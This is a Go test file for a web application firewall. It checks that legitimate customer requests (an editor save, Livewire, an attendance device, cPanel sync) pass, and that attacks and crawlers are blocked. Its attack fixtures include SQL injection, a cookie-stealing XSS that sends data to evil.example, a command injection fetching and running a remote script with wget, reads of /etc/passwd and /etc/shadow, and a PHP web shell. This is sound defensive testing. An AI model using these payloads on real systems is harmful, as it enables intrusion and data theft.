package waf

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// TestCustomerFalsePositivesWithCRS replays the kinds of requests customers
// were refused on a live shared server (WAF level normal): an admin panel
// editor saving HTML with code samples, a Livewire component update, an
// attendance device, cPanel's calendar sync and mail client setup. A real
// attack with the same session and the same requests from another site
// stay blocked.
func TestCustomerFalsePositivesWithCRS(t *testing.T) {
	src := os.Getenv("XG_CRS_DIR")
	if src == "" {
		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
	}
	m := crsManager(t, src, `{"waf":{"enabled":true,"level":"normal","wordpress":true,"generic":true,"bad_bots":true,"sensitive_files":true}}`, "off", nil)
	form, json := "application/x-www-form-urlencoded", "application/json"
	if st := m.Status(); st.Error != "" {
		t.Fatalf("WAF error: %s", st.Error)
	}
	if os.Getenv("XG_DEBUG_WAF") != "" {
		out, _ := exec.Command("apache2ctl", "-t").CombinedOutput()
		t.Logf("configtest: %s\nstates: %+v", out, m.RuleSetStates())
		b, _ := os.ReadFile(filepath.Join(m.RulesDir, "crs-after.conf"))
		t.Logf("after: %s", b)
	}
	editor := "title=Lesson+5&body=" + urlEncode(`<p style="color:#333;font-size:14px">Linux basics: type <code>uname -a</code> then <code>whoami</code> in the terminal.</p><p><a href="https://ssc.example.pk/notes.pdf" target="_blank">Notes</a></p>`)
	live := `{"_token":"abc","components":[{"snapshot":"{\"data\":{\"name\":\"\\u0645\\u0631\\u0627\\u06cc\\u0645\"}}","updates":{"name":"مریم <b>Khan</b>"},"calls":[]}]}`
	attack := "id=" + urlEncode(`1' UNION SELECT username,password FROM users-- -`) + "&q=" + urlEncode(`<script>alert(document.cookie)</script>`) + "&cmd=" + urlEncode(`;cat /etc/passwd;wget http://198.51.100.9/x.sh|sh;`) + "&f=" + urlEncode(`../../../../etc/shadow`) + "&p=" + urlEncode(`<?php system($_GET['c']); ?>`)
	sess := "Cookie: PHPSESSID=0123456789abcdef; XSRF-TOKEN=eyJpdiI6"
	self := "Referer: https://ssc.example.pk/alms/Teacher/Editing.php?id=4"

	cases := []struct {
		name, host, method, uri, ctype, body string
		hdr                                  []string
		want                                 int
	}{
		{"Editor without session or own page is blocked (baseline)", "ssc.example.pk", "POST", "/alms/Teacher/Editing.php", form, editor, nil, 403},
		{"Editor saving from its own page with a session", "ssc.example.pk", "POST", "/alms/Teacher/Editing.php", form, editor, []string{sess, self}, 200},
		{"Same save sent from another site", "ssc.example.pk", "POST", "/alms/Teacher/Editing.php", form, editor, []string{sess, "Referer: https://evil.example.net/alms/Teacher/Editing.php"}, 403},
		{"Real attack with a session stays blocked", "ssc.example.pk", "POST", "/alms/Teacher/Editing.php", form, attack, []string{sess, self}, 403},
		{"Stored XSS through a public form with a session stays blocked", "tea.example.com", "POST", "/submit-comment.php", form, "name=Ali&comment=" + urlEncode(`great <script>document.location="https://evil.example/?c="+document.cookie</script>`), []string{"Cookie: PHPSESSID=abc", "Referer: https://tea.example.com/product.php?id=4"}, 403},
		{"Comment that reads like SQL, with a session", "tea.example.com", "POST", "/submit-comment.php", form, "name=Ali&comment=" + urlEncode(`Best tea -- select it if you like strong taste; 1 or 2 cups/day = perfect`), []string{"Cookie: PHPSESSID=abc", "Referer: https://tea.example.com/product.php?id=4"}, 200},
		// A server overloaded by an SEO backlink crawler walking shop filters.
		{"Backlink crawler on shop filters", "shop.example.com", "GET", "/shop/?s=Kitchen&post_type=product&filter_color=yellow,white,orange", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; SERankingBacklinksBot/1.0; +https://seranking.com/backlinks-crawler)"}, 403},
		{"Backlink crawler on page size", "shop.example.com", "GET", "/shop/page/60/?per_page=24&orderby=price", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; SERankingBacklinksBot/1.0)"}, 403},
		{"Backlink crawler on a plain product page", "shop.example.com", "GET", "/product/kettle/", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; SERankingBacklinksBot/1.0)"}, 200},
		{"Googlebot on shop filters", "shop.example.com", "GET", "/shop/?filter_color=yellow", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}, 200},
		{"Googlebot following add-to-cart", "shop.example.com", "GET", "/shop/?add-to-cart=123", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}, 403},
		{"Visitor using shop filters and cart", "shop.example.com", "GET", "/shop/?filter_color=yellow&orderby=price&add-to-cart=123", "", "", nil, 200},
		{"Stripe settings dump", "shop.example.com", "GET", "/wp-content/woocommerce_stripe_settings.tar.gz", "", "", nil, 403},
		{"Stripe settings text", "shop.example.com", "GET", "/wp-content/woocommerce_stripe_cc_settings.txt", "", "", nil, 403},
		{"Options dump", "shop.example.com", "GET", "/wp_options.sql", "", "", nil, 403},
		{"Livewire update (Origin header)", "shop.example.top", "POST", "/livewire-4fd0b3db/update", json, live, []string{"Cookie: laravel_session=abc; XSRF-TOKEN=def", "Origin: https://shop.example.top", "X-Livewire: 1"}, 200},
		{"Attendance device push", "hospital.example.com", "POST", "/iclock/cdata?SN=UFS2261401098&table=ATTLOG&Stamp=9999", "application/push", "1001\t2026-10-10 08:01:22\t0\t1\t0\t0\t0", []string{"User-Agent: iClock Proxy/1.09"}, 200},
		{"cPanel calendar sync", "cpcalendars.example.com", "POST", "/", "text/xml", `<?xml version="1.0"?><C:calendar-query xmlns:C="urn:ietf:params:xml:ns:caldav"><D:prop xmlns:D="DAV:"><D:getetag/></D:prop><C:filter><C:comp-filter name="VCALENDAR"/></C:filter></C:calendar-query>`, []string{"Cookie: cpsession=abc"}, 200},
		{"Thunderbird/Outlook setup", "127.0.0.1", "POST", "/cgi-sys/autodiscover.cgi", "text/xml", `<?xml version="1.0"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>ali@example.pk</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>`, nil, 200},
	}
	for _, c := range cases {
		if got := sendBody(t, c.host, c.method, c.uri, c.ctype, c.body, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
			t.Errorf("%s: %s %s got %d, want %d", c.name, c.method, c.uri, got, c.want)
		}
	}
	if !strings.Contains(sessionSetup(), "id:7700044") {
		t.Fatal("session rule id")
	}
}
